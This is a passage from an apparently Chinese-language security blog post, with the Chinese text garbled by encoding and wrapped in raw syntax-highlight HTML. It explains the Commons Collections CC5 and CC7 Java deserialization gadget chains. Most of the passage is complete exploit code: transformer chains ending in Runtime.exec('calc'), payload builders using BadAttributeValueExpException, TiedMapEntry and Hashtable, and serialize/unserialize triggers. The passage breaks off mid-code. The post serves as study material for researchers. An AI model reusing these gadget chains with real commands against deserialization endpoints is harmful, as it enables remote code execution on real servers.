class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  <br>  <br> Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  <br> <span class="hljs-type">Method</span> <span class="hljs-variable">lazyGetMethod</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredMethod(<span class="hljs-string">&quot;get&quot;</span>, Object.class);  <br> lazyGetMethod.setAccessible(<span class="hljs-literal">true</span>);  <br> lazyGetMethod.invoke(decorateMap, <span class="hljs-string">&quot;everything!&quot;</span>);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç”¨åå°„ç›´æ¥è°ƒç”¨äº†<code>get</code>æ–¹æ³•å¼¹å‡ºè®¡ç®—å™¨ã€‚æ¥ä¸‹æ¥åˆ©ç”¨<code>TiedMapEntry</code> ç±»è°ƒç”¨ <code>toString()</code>è¿›è€Œè°ƒç”¨<code>get</code>æ–¹æ³•ï¼š</p><p><img src="/img/CC5.png" alt="CC5"></p><p>EXP:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// TiedMapEntry çš„ EXP ç¼–å†™  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TiedMapEntryEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class), <span class="hljs-comment">// æ„é€  setValue çš„å¯æ§å‚æ•°  </span><br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  <br> <span class="hljs-comment">//ä¸Šé¢éƒ½ä¸€æ ·ï¼Œå°±æ˜¯æ¢äº†ä¸ªæ–¹æ³•è§¦å‘getæ–¹æ³•</span><br> <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(decorateMap, <span class="hljs-string">&quot;value&quot;</span>);  <br> tiedMapEntry.toString();  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>å‰é¢è¯´äº†å…¥å£æ˜¯ <code>BadAttributeValueExpException</code> çš„ <code>readObject()</code> ï¼Œ<code>new</code>ä¸€ä¸ªä¹‹å ç»™<code>val</code>èµ‹å€¼ä¸º<code>TiedMapEntry</code>çš„å®ä¾‹å°±è¡Œï¼Œç„¶ååºåˆ—åŒ–ï¼Œååºåˆ—åŒ–æ—¶å°±èƒ½è§¦å‘äº†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> entity;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">// TiedMapEntry çš„ EXP ç¼–å†™</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TiedMapEntryEXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class), <span class="hljs-comment">// æ„é€  setValue çš„å¯æ§å‚æ•°</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);<br>        <span class="hljs-comment">//ä¸Šé¢éƒ½ä¸€æ ·ï¼Œå°±æ˜¯æ¢äº†ä¸ªæ–¹æ³•è§¦å‘getæ–¹æ³•</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(decorateMap, <span class="hljs-string">&quot;value&quot;</span>);<br><span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>); <br><span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);  <br>field.setAccessible(<span class="hljs-literal">true</span>);  <br>field.set(badAttributeValueExpException, tiedMapEntry);<br>serialize(badAttributeValueExpException);  <br>    unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è°ƒç”¨é¡ºåºï¼š</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs coq">BadAttributeValueExpException.readObject-&gt;TiedMapEntry.toString<br>-&gt;LazyMap.get-&gt;ChainedTransformer.transform<br>-&gt;ConstantTransformer.transform-&gt;InvokerTransformer.transform<br>-&gt;Method.invoke-&gt;<span class="hljs-keyword">Class</span>.getMethod<br>-&gt;InvokerTransformer.transform-&gt;Method.invoke<br>-&gt;Runtime.getRuntime-&gt; InvokerTransformer.transform<br>-&gt;Method.invoke-&gt;Runtime.exec<br></code></pre></td></tr></table></figure><h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><p>ä¸»è¦å‚è€ƒäº†è¿™ä¸¤ä½å¸ˆå‚…çš„æ–‡ç« ï¼š</p><p><a href="https://xz.aliyun.com/t/10457">1</a></p><p><a href="https://drun1baby.top/2022/06/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8708-CC7%E9%93%BE/">2</a></p><p>ååŠæ¡é“¾å­ä¸CC1ç›¸åŒï¼Œå‰åŠéƒ¨åˆ†å…¥å£ç±»ä¸ºï¼š<code>Hashtable</code>ï¼Œå®ƒçš„<code>readObject</code>æ–¹æ³•è°ƒç”¨äº†ä¸€ä¸ª<code>reconstitutionPut</code>æ–¹æ³•ï¼š</p><p><img src="/img/HashtableReadObject.png" alt="HashtableReadObject"></p><p>è·Ÿè¿›è¿™ä¸ª<code>reconstitutionPut</code>:</p><p><img src="/img/CC701.png" alt="CC701"></p><p>è¿™é‡Œæœ‰ä¸¤ä¸ªå¯ç”¨çš„æ–¹æ³•ï¼š<code>equals()</code> å’Œ <code>hashCode()</code>ã€‚(è¿™é‡Œæœ‰ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹æ˜¯ï¼šä¸ç®¡æ˜¯<code>reconstitutionPut</code>æ–¹æ³•è¿˜æ˜¯<code>equals</code>æ–¹æ³•ï¼Œéƒ½å¾—å…ˆè¿›<code>for</code>å¾ªç¯æ‰è¡Œ)ã€‚<code>hashCode</code>çš„è¯å°±æ˜¯CC6é‚£æ¡ï¼Œå…ˆçœ‹<code>equals</code>ï¼š</p><p><code>AbstractMap</code> ç±»ä¸­çš„ <code>equals()</code> æ–¹æ³•ä¸­å‘ç°å…¶è°ƒç”¨äº† <code>get()</code> æ–¹æ³•ï¼š</p><p><img src="/img/AbstractMap.png" alt="AbstractMap"></p><p>è¿™é‡Œ<code>equals</code>æ¥å—ä¸€ä¸ª<code>object o </code>ï¼Œç„¶åæŠŠè¿™ä¸ª<code>o</code>ä¼ ç»™<code>m</code>ï¼Œå³<code>reconstitutionPut</code>ä¸­çš„<code>key</code></p><p>å…¶å®å°±æ˜¯é€šè¿‡<code>AbstractMap#equals</code>æ¥è°ƒç”¨<code>LazyMap#get</code>ã€‚ç°åœ¨è¯•ç€åˆ†æä¸€ä¸‹è¿™ä¸ªâ€™â€™æ–°çš„â€™â€™<code>CC1</code>å‰åŠéƒ¨åˆ†ï¼š</p><p><code>reconstitutionPut</code>:</p><p><img src="/img/HashTable.png" alt="HashTable"></p><p>è¿™é‡Œå¯¹ä¼ è¿›çš„ Entry å¯¹è±¡æ•°ç»„è¿›è¡Œäº†å¾ªç¯ï¼Œé€ä¸ªè°ƒç”¨<code>e.key.equals(key)</code>ï¼Œè¿™é‡Œçš„<code>e</code>å°±æ˜¯ä¸ªç´¢å¼•ã€‚ä¼ è¿›å»çš„å‚æ•°keyå¦‚æœæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œé‚£ä¹ˆ<code>AbstractMap.equals()</code>ä¸­çš„må°±æ˜¯æˆ‘ä»¬å¯æ§çš„(é€»è¾‘å°±æ˜¯<code>equals</code>æ¥å—çš„å‚æ•°æ˜¯<code>Object o</code>ï¼Œç„¶å<code>Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</code>)ã€‚æœ€åè¦æ³¨æ„è¿™ä¸¤ä¸ª<code>key</code>ï¼š<code>e.key.equals(key)</code>ï¼Œå‰é¢é‚£ä¸ª<code>e.key</code> æ˜¯è¯¥æ¡ç›®çš„é”®ï¼Œè€Œ <code>key</code> æ˜¯ä½œä¸ºå‚æ•°ä¼ é€’ç»™ <code>reconstitutionPut</code> æ–¹æ³•çš„é”®ã€‚æ‰€ä»¥æˆ‘ä»¬åœ¨åºåˆ—åŒ–æ—¶å¯ä»¥åˆ©ç”¨<code>put</code>ç»™<code>hashtable</code>æ”¾ä¸€ä¸ª<code>key</code>&#x3D;æ¶æ„ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();  <br>hashtable.put(decorateMap, <span class="hljs-string">&quot;Drunkbaby&quot;</span>);<br></code></pre></td></tr></table></figure><p>ç„¶ååºåˆ—åŒ–åç”¨ååºåˆ—åŒ–è§¦å‘ä»–ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;  <br>  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.util.*;  <br>  <br><span class="hljs-comment">// AbstractMap çš„ EXPpublic class AbstractMapEXP &#123;  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class), <span class="hljs-comment">// æ„é€  setValue çš„å¯æ§å‚æ•°  </span><br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  <br>  <br> <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();  <br> hashtable.put(decorateMap, <span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-comment">//serialize(hashtable);  </span><br> <span class="hljs-comment">//unserialize(&quot;ser.bin&quot;);  </span><br> &#125;  <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†è¿™æ—¶è¿è¡Œå¹¶ä¸ä¼šå¼¹è®¡ç®—å™¨ï¼Œæ–­ç‚¹æ‰“åœ¨<code>AbstractMap.equals()</code>ç„¶åè°ƒè¯•ä¸€ä¸‹ï¼Œå¯ä»¥å‘ç°å¹¶æ²¡æœ‰è¿›åˆ°<code>equals</code>é‡Œé¢ï¼Œå®˜æ–¹é“¾å­å†™æ³•å¦‚ä¸‹ï¼š</p><p><img src="/img/yso.png" alt="yso"></p><p>å¯ä»¥çœ‹åˆ°å®ƒåˆ©ç”¨<code>decorate</code>æå‡ºäº†ä¸¤ä¸ª<code>lazymap</code>(EXPä¸­å†™çš„é‚£ä¸ª<code>decorateMap</code>)ï¼Œç„¶åä»–ç»™è¿™ä¸ª<code>map</code>é‡Œåˆ†åˆ«æ”¾äº†é”®<code>yy</code>å’Œ<code>zZ</code>ï¼Œå€¼éƒ½æ˜¯1ã€‚ç„¶åæŠŠè¿™ä¸¤ä¸ªæ¶æ„ç±»éƒ½æ”¾è¿›<code>hashtable</code>é‡Œåæ”¹äº†ä¸‹<code>transformerChain</code>ä¸­<code>iTransfomers</code>çš„å€¼(ä¹Ÿå°±æ˜¯EXPä¸­å†™çš„é‚£ä¸ª<code>chainedTransformer</code>)ã€‚</p><p>è¿™é‡Œç›´æ¥æŠŠæ­£ç¡®çš„EXPæ”¾ä¸Šæ¥ï¼Œå¯¹ç…§ç€åˆ†æï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC7</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException &#123;<br><br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;&#125;;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title 